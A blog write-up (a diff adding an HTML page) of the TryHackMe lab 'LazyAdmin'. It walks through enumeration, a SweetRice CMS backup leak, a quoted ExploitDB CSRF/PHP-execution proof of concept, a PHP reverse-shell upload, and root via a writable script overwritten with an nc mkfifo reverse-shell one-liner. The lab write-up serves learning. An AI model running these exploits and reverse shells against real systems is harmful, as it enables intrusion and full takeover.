@@ -1,0 +1,884 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="en">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+<meta name="baidu-site-verification" content="codeva-HZoIBm8yNp" />
+<meta name="bytedance-verification-code" content="xa6iZeY+/XCOJvarHaDY" />
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Linux,TryHackMe,Reverse Shell,Privilege Escalation," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="Introduction This is a writeup for the room LazyAdmin on TryHackMe. LazyAdmin is a beginner level room that focuses on Linux exploitation. This room is pretty similar to the other rooms I’ve done, wit">
+<meta property="og:type" content="article">
+<meta property="og:title" content="THM: LazyAdmin">
+<meta property="og:url" content="https://blog.feedscoin.com/THM-LazyAdmin/index.html">
+<meta property="og:site_name" content="逐流小站">
+<meta property="og:description" content="Introduction This is a writeup for the room LazyAdmin on TryHackMe. LazyAdmin is a beginner level room that focuses on Linux exploitation. This room is pretty similar to the other rooms I’ve done, wit">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://blog.feedscoin.com/img/lazyadmin/1.png">
+<meta property="og:image" content="https://blog.feedscoin.com/img/lazyadmin/2.png">
+<meta property="og:image" content="https://blog.feedscoin.com/img/lazyadmin/3.png">
+<meta property="og:image" content="https://blog.feedscoin.com/img/lazyadmin/4.png">
+<meta property="og:image" content="https://blog.feedscoin.com/img/lazyadmin/5.png">
+<meta property="og:image" content="https://blog.feedscoin.com/img/lazyadmin/6.png">
+<meta property="og:image" content="https://blog.feedscoin.com/img/lazyadmin/7.png">
+<meta property="og:image" content="https://blog.feedscoin.com/img/lazyadmin/8.png">
+<meta property="og:image" content="https://blog.feedscoin.com/img/lazyadmin/9.png">
+<meta property="og:image" content="https://blog.feedscoin.com/img/lazyadmin/10.png">
+<meta property="og:image" content="https://blog.feedscoin.com/img/lazyadmin/11.png">
+<meta property="og:image" content="https://blog.feedscoin.com/img/lazyadmin/12.png">
+<meta property="og:image" content="https://blog.feedscoin.com/img/lazyadmin/13.png">
+<meta property="og:image" content="https://blog.feedscoin.com/img/lazyadmin/14.png">
+<meta property="og:image" content="https://blog.feedscoin.com/img/lazyadmin/15.png">
+<meta property="article:published_time" content="2023-12-27T21:26:33.000Z">
+<meta property="article:modified_time" content="2024-03-02T04:47:56.775Z">
+<meta property="article:author" content="Laird Lau">
+<meta property="article:tag" content="Linux">
+<meta property="article:tag" content="TryHackMe">
+<meta property="article:tag" content="Reverse Shell">
+<meta property="article:tag" content="Privilege Escalation">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://blog.feedscoin.com/img/lazyadmin/1.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '',
+    scheme: 'Muse',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://blog.feedscoin.com/THM-LazyAdmin/"/>
+
+
+
+
+
+  <title>THM: LazyAdmin | 逐流小站</title>
+  
+
+
+
+
+
+<!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-MW47YH6RH0"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-MW47YH6RH0');
+</script>
+
+
+
+
+
+<meta name="generator" content="Hexo 7.0.0"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="en">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">逐流小站</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <h1 class="site-subtitle" itemprop="description">想回到那个能随便跳槽的年代</h1>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            Tags
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            Categories
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            Archives
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-sitemap">
+          <a href="/sitemap.xml" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-sitemap"></i> <br />
+            
+            Sitemap
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://blog.feedscoin.com/THM-LazyAdmin/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="逐流小站">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h2 class="post-title" itemprop="name headline">THM: LazyAdmin</h2>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2023-12-27T21:26:33+00:00">
+                2023-12-27
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/TryHackMe/" itemprop="url" rel="index">
+                    <span itemprop="name">TryHackMe</span>
+                  </a>
+                </span>
+
+                
+                
+
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+    <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-4522670236044605"
+     crossorigin="anonymous"></script>
+<ins class="adsbygoogle"
+     style="display:block; text-align:center;"
+     data-ad-layout="in-article"
+     data-ad-format="fluid"
+     data-ad-client="ca-pub-4522670236044605"
+     data-ad-slot="5167312561"></ins>
+<script>
+     (adsbygoogle = window.adsbygoogle || []).push({});
+</script>
+      
+      
+
+      
+
+        <h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><p> This is a writeup for the room <a target="_blank" rel="noopener" href="https://tryhackme.com/room/lazyadmin">LazyAdmin</a> on <a target="_blank" rel="noopener" href="https://tryhackme.com/">TryHackMe</a>. LazyAdmin is a beginner level room that focuses on Linux exploitation.</p>
+<p>This room is pretty similar to the other rooms I’ve done, with reverse shells, web servers, CMSes and privilege escalation. Nonetheless, it was a good avenue for me to apply what I’ve learnt B-)</p>
+<h1 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a>Enumeration</h1><h2 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h2><p>As usual, we start with our Nmap scan.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sC -sV &lt;ip&gt;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-12-27 21:25 +08</span><br><span class="line">Stats: 0:00:16 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan</span><br><span class="line">Connect Scan Timing: About 36.86% <span class="keyword">done</span>; ETC: 21:26 (0:00:27 remaining)</span><br><span class="line">Stats: 0:01:20 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan</span><br><span class="line">Service scan Timing: About 50.00% <span class="keyword">done</span>; ETC: 21:27 (0:00:07 remaining)</span><br><span class="line">Nmap scan report <span class="keyword">for</span> &lt;ip&gt;</span><br><span class="line">Host is up (0.33s latency).</span><br><span class="line">Not shown: 998 closed tcp ports (conn-refused)</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   2048 49:7c:f7:41:10:43:73:da:2c:e6:38:95:86:f8:e0:f0 (RSA)</span><br><span class="line">|   256 2f:d7:c4:4c:e8:1b:5a:90:44:<span class="built_in">df</span>:c0:63:8c:72:ae:55 (ECDSA)</span><br><span class="line">|_  256 61:84:62:27:c6:c3:29:17:<span class="built_in">dd</span>:27:45:9e:29:cb:90:5e (ED25519)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))</span><br><span class="line">|_http-title: Apache2 Ubuntu Default Page: It works</span><br><span class="line">|_http-server-header: Apache/2.4.18 (Ubuntu)</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br></pre></td></tr></table></figure>
+
+<p>Here, we see two ports open, SSH and HTTP.</p>
+<p>Let’s start at the web server.</p>
+<h2 id="Web-Server"><a href="#Web-Server" class="headerlink" title="Web Server"></a>Web Server</h2><p>The web server is the default Apache2 Ubuntu page.</p>
+<p><img src="/./img/lazyadmin/1.png" alt="Apache2 Ubuntu Default Page"></p>
+<p>Doesn’t seem like we can do much here. So let’s run a directory brute force.</p>
+<h2 id="Dirb"><a href="#Dirb" class="headerlink" title="Dirb"></a>Dirb</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirb http://&lt;ip&gt;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">---- Scanning URL: http://&lt;ip&gt;/ ----</span><br><span class="line">==&gt; DIRECTORY: http://&lt;ip&gt;/content/</span><br><span class="line">+ http://&lt;ip&gt;/index.html (CODE:200|SIZE:11321)</span><br><span class="line">+ http://&lt;ip&gt;/server-status (CODE:403|SIZE:278)</span><br><span class="line"></span><br><span class="line">---- Entering directory: http://&lt;ip&gt;/content/ ----</span><br><span class="line">==&gt; DIRECTORY: http://&lt;ip&gt;/content/_themes/</span><br></pre></td></tr></table></figure>
+
+<p>(Accidentally stopped the scan here…)</p>
+<p>The results took quite a bit of time, so I looked at the results as it came in. The first result was <code>/content/</code>.</p>
+<p><img src="/./img/lazyadmin/2.png" alt="Content"></p>
+<p>Seems like some sort of CMS (Content Management System) thing. As per one of the last labs, there was a CVE related to Fuel CMS. I checked if this CMS had an entry in ExploitDB.</p>
+<p><img src="/./img/lazyadmin/3.png" alt="ExploitDB"></p>
+<p>Seems like there are a few! While we don’t know what exact version this SweetRice CMS is, I looked through the various exploits. <code>Arbitrary File Upload</code> seemed like it could be useful in getting a reverse shell and <code>Backup Disclosure</code> seemed like it could be useful in getting some credentials. <code>Cross-Site Request Forgery / PHP Code Execution</code> seemed like it could be useful in getting a reverse shell as well.</p>
+<h1 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h1><h2 id="Backup-Disclosure"><a href="#Backup-Disclosure" class="headerlink" title="Backup Disclosure"></a>Backup Disclosure</h2><p>The first exploit I looked into was <code>Backup Disclosure</code>.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">Title: SweetRice 1.5.1 - Backup Disclosure</span><br><span class="line">Application: SweetRice</span><br><span class="line">Versions Affected: 1.5.1</span><br><span class="line">Vendor URL: http://www.basic-cms.org/</span><br><span class="line">Software URL: http://www.basic-cms.org/attachment/sweetrice-1.5.1.zip</span><br><span class="line">Discovered by: Ashiyane Digital Security Team</span><br><span class="line">Tested on: Windows 10</span><br><span class="line">Bugs: Backup Disclosure</span><br><span class="line">Date: 16-Sept-2016</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Proof of Concept :</span><br><span class="line"></span><br><span class="line">You can access to all mysql backup and download them from this directory.</span><br><span class="line">http://localhost/inc/mysql_backup</span><br><span class="line"></span><br><span class="line">and can access to website files backup from:</span><br><span class="line">http://localhost/SweetRice-transfer.zip</span><br></pre></td></tr></table></figure>
+
+<p>It seems like we could get some MySQL backups. Going to the <code>&lt;ip&gt;/inc/mysql_backup</code> directory, there was unfortunately nothing there.</p>
+<p><img src="/./img/lazyadmin/4.png" alt="MySQL Backup"></p>
+<p>After a bit of thinking and poking around, I realised that the home directory wasn’t even the CMS haha… I had to go to <code>&lt;ip&gt;/content/inc/mysql_backup</code> instead.</p>
+<p><img src="/./img/lazyadmin/5.png" alt="MySQL Backup"></p>
+<p>From there, there was a backup file present. I downloaded it and had a look at it.</p>
+<p><img src="/./img/lazyadmin/6.png" alt="MySQL Backup"></p>
+<p>Googling about MySQL backups, I found that it was a set of PHP commands used to interact with the MySQL database. Within it, there was a username and hashed password.</p>
+<p><img src="/./img/lazyadmin/7.png" alt="MySQL Backup"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;description\\&quot;;s:11:\\&quot;Description\\&quot;;s:5:\\&quot;admin\\&quot;;s:7:\\&quot;manager\\&quot;;s:6:\\&quot;passwd\\&quot;;s:32:\\&quot;42f749ade7f9e195bf475f37a44cafcb\\&quot;;s:5:\\&quot;close\\&quot;;i:1;s:9:\\&quot;close_tip\\&quot;;s:454:\\&quot;&lt;p&gt;Welcome to SweetRice - Thank your for install SweetRice as your website management system.&lt;/p&gt;&lt;h1&gt;This site is build</span><br></pre></td></tr></table></figure>
+
+<p>I tried going to <a target="_blank" rel="noopener" href="https://crackstation.net/">CrackStation</a> to crack it and it worked.</p>
+<p><img src="/./img/lazyadmin/8.png" alt="MySQL Backup"></p>
+<p>Now that we have the credentials, we can move on to logging in to the CMS. Except… I don’t know where the login page is. Earlier on, I very coincidentally stopped the <code>dirb</code> as it was going through the <code>/content</code> directory.</p>
+<p>Once again, I had to use <code>dirb</code> to find pages within <code>/content</code>.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">==&gt; DIRECTORY: http://&lt;ip&gt;/content/_themes/</span><br><span class="line">==&gt; DIRECTORY: http://&lt;ip&gt;/content/as/</span><br><span class="line">==&gt; DIRECTORY: http://&lt;ip&gt;/content/attachment/</span><br></pre></td></tr></table></figure>
+
+<p>The <code>as</code> directory seemed the most interesting, so I went to it. Sure enough, it was the login page we were looking for. Logging in with the credentials we found earlier, we get access to the dashboard.</p>
+<p><img src="/./img/lazyadmin/9.png" alt="as"></p>
+<p>And now, we can see the dashboard.</p>
+<p><img src="/./img/lazyadmin/10.png" alt="dashboard"></p>
+<p>But just being able to see the dashboard isn’t really enough for us to do anything. I was a little stuck, so I looked at the other exploits.</p>
+<h2 id="Cross-Site-Request-Forgery-PHP-Code-Execution"><a href="#Cross-Site-Request-Forgery-PHP-Code-Execution" class="headerlink" title="Cross-Site Request Forgery &#x2F; PHP Code Execution"></a>Cross-Site Request Forgery &#x2F; PHP Code Execution</h2><p>From ExploitDB:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line"># Exploit Title: SweetRice 1.5.1 Arbitrary Code Execution</span><br><span class="line"># Date: 30-11-2016</span><br><span class="line"># Exploit Author: Ashiyane Digital Security Team</span><br><span class="line"># Vendor Homepage: http://www.basic-cms.org/</span><br><span class="line"># Software Link: http://www.basic-cms.org/attachment/sweetrice-1.5.1.zip</span><br><span class="line"># Version: 1.5.1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># Description :</span><br><span class="line"></span><br><span class="line"># In SweetRice CMS Panel In Adding Ads Section SweetRice Allow To Admin Add</span><br><span class="line">PHP Codes In Ads File</span><br><span class="line"># A CSRF Vulnerability In Adding Ads Section Allow To Attacker To Execute</span><br><span class="line">PHP Codes On Server .</span><br><span class="line"># In This Exploit I Just Added a echo &#x27;&lt;h1&gt; Hacked &lt;/h1&gt;&#x27;; phpinfo();</span><br><span class="line">Code You Can</span><br><span class="line">Customize Exploit For Your Self .</span><br><span class="line"></span><br><span class="line"># Exploit :</span><br><span class="line">--&gt;</span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body onload=&quot;document.exploit.submit();&quot;&gt;</span><br><span class="line">&lt;form action=&quot;http://localhost/sweetrice/as/?type=ad&amp;mode=save&quot; method=&quot;POST&quot; name=&quot;exploit&quot;&gt;</span><br><span class="line">&lt;input type=&quot;hidden&quot; name=&quot;adk&quot; value=&quot;hacked&quot;/&gt;</span><br><span class="line">&lt;textarea type=&quot;hidden&quot; name=&quot;adv&quot;&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">echo &#x27;&lt;h1&gt; Hacked &lt;/h1&gt;&#x27;;</span><br><span class="line">phpinfo();?&gt;</span><br><span class="line">&amp;lt;/textarea&amp;gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br><span class="line">&lt;!--</span><br><span class="line"># After HTML File Executed You Can Access Page In</span><br><span class="line">http://localhost/sweetrice/inc/ads/hacked.php</span><br><span class="line">  --&gt;</span><br></pre></td></tr></table></figure>
+
+<p>So this seems like an admin can add a malicious ‘ad’ to the website which can be a PHP file. Thus, we could probably use this to get a reverse shell, since we already have admin access.</p>
+<h3 id="Reverse-Shell-User-Flag"><a href="#Reverse-Shell-User-Flag" class="headerlink" title="Reverse Shell - User Flag"></a>Reverse Shell - User Flag</h3><p>Using the usual PHP reverse shell from <a href="www.github.com/pentestmonkey/php-reverse-shell">pentestmonkey</a>, I modified the exploit’s IP to match my host’s IP.</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$ip</span> = <span class="string">&#x27;&lt;host_ip&gt;&#x27;</span>;  <span class="comment">// CHANGE THIS</span></span><br><span class="line"><span class="variable">$port</span> = <span class="number">1234</span>;       <span class="comment">// CHANGE THIS</span></span><br></pre></td></tr></table></figure>
+
+<p>Next, I uploaded the PHP exploit on the <code>ads</code> tab on the dashboard, giving it the name <code>exploit</code>, and submitted it.</p>
+<p><img src="/./img/lazyadmin/11.png" alt="ads"></p>
+<p>From there, I started a netcat listener on my host device.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 1234</span><br></pre></td></tr></table></figure>
+
+<p>Then, to run the exploit, I went to <code>http://&lt;ip&gt;/content/inc/ads/exploit</code>.</p>
+<p>On my netcat listener, I got a connection! I then stabilised the shell so that I could use more commands.</p>
+<p><img src="/./img/lazyadmin/12.png" alt="stabilise"></p>
+<p>Once that was done, I navigated to the home directory and found the user flag.</p>
+<p><img src="/./img/lazyadmin/13.png" alt="userflag"></p>
+<h3 id="Privilege-Escalation-Root-Flag"><a href="#Privilege-Escalation-Root-Flag" class="headerlink" title="Privilege Escalation - Root Flag"></a>Privilege Escalation - Root Flag</h3><p>Now, we have to find out how to escalate our privileges to root. Running <code>sudo -l</code>, we can see what commands we can run as root.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">www-data@THM-Chal:/$ sudo -l</span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> www-data on THM-Chal:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</span><br><span class="line"></span><br><span class="line">User www-data may run the following commands on THM-Chal:</span><br><span class="line">    (ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl</span><br></pre></td></tr></table></figure>
+
+<p>That’s wild. We can run a Perl script <code>backup.pl</code> as root. Let’s check out the file. Looking at the permissions:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">www-data@THM-Chal:/$ <span class="built_in">ls</span> -la /home/itguy/backup.pl</span><br><span class="line">-rw-r--r-x 1 root root 47 Nov 29  2019 /home/itguy/backup.pl</span><br></pre></td></tr></table></figure>
+
+<p>We can see that we can only read and execute the file. That’s a bummer, since we can’t edit the file. But first, let’s see what the file does.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">www-data@THM-Chal:/$ <span class="built_in">cat</span> /home/itguy/backup.pl</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight pl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/perl</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">system</span>(<span class="string">&quot;sh&quot;</span>, <span class="string">&quot;/etc/copy.sh&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>So it runs a shell script <code>copy.sh</code> in the <code>/etc</code> directory. Similarly, let’s check out the permissions and see what the contents of the file are.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">www-data@THM-Chal:/$ <span class="built_in">ls</span> -la /etc/copy.sh</span><br><span class="line">-rw-r--rwx 1 root root 81 Nov 29  2019 /etc/copy.sh</span><br><span class="line">www-data@THM-Chal:/$ <span class="built_in">cat</span> /etc/copy.sh</span><br><span class="line"><span class="built_in">rm</span> /tmp/f;<span class="built_in">mkfifo</span> /tmp/f;<span class="built_in">cat</span> /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.0.190 5554 &gt;/tmp/f</span><br></pre></td></tr></table></figure>
+
+<p>Firstly, we have <code>rwx</code> permissions on it, which means that we can edit the file. Secondly, its pretty interesting that <code>/etc/copy.sh</code>… is a reverse shell. What we need to do is to edit the IP address and set up a netcat listener.</p>
+<p>Amazingly, the system did not have any text editors installed&#x2F;enabled :|</p>
+<p><img src="/./img/lazyadmin/14.png" alt="noeditors"></p>
+<p>Alright fine. We can use echo instead to overwrite the file. Being a lazy pleb, I went to a <a target="_blank" rel="noopener" href="https://www.revshells.com/">Reverse Shell Generator</a> to generate a similar reverse shell.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">www-data@THM-Chal:/$ <span class="built_in">echo</span> <span class="string">&quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2&gt;&amp;1|nc 10.2.95.111 2345 &gt;/tmp/f&quot;</span> &gt; /etc/copy.sh</span><br><span class="line">www-data@THM-Chal:/$ <span class="built_in">cat</span> /etc/copy.sh</span><br><span class="line"><span class="built_in">rm</span> /tmp/f;<span class="built_in">mkfifo</span> /tmp/f;<span class="built_in">cat</span> /tmp/f|sh -i 2&gt;&amp;1|nc 10.2.95.111 2345 &gt;/tmp/f</span><br></pre></td></tr></table></figure>
+
+<p>After running the netcat listener, we can run the Perl script as root.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">www-data@THM-Chal:/$ sudo /usr/bin/perl /home/itguy/backup.pl</span><br></pre></td></tr></table></figure>
+
+<p>From there, we get a root shell! We can now get the root flag.</p>
+<p><img src="/./img/lazyadmin/15.png" alt="rootflag"></p>
+<h1 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h1><p>This was a rather easy room for me, and I do like that there were multiple ways to solve it (with the various exploits). I’m definitely feeling more confident in my skills in solving the easier rooms, and hopefully I can move on to the harder ones soon! :D</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/Linux/" rel="tag"># Linux</a>
+          
+            <a href="/tags/TryHackMe/" rel="tag"># TryHackMe</a>
+          
+            <a href="/tags/Reverse-Shell/" rel="tag"># Reverse Shell</a>
+          
+            <a href="/tags/Privilege-Escalation/" rel="tag"># Privilege Escalation</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
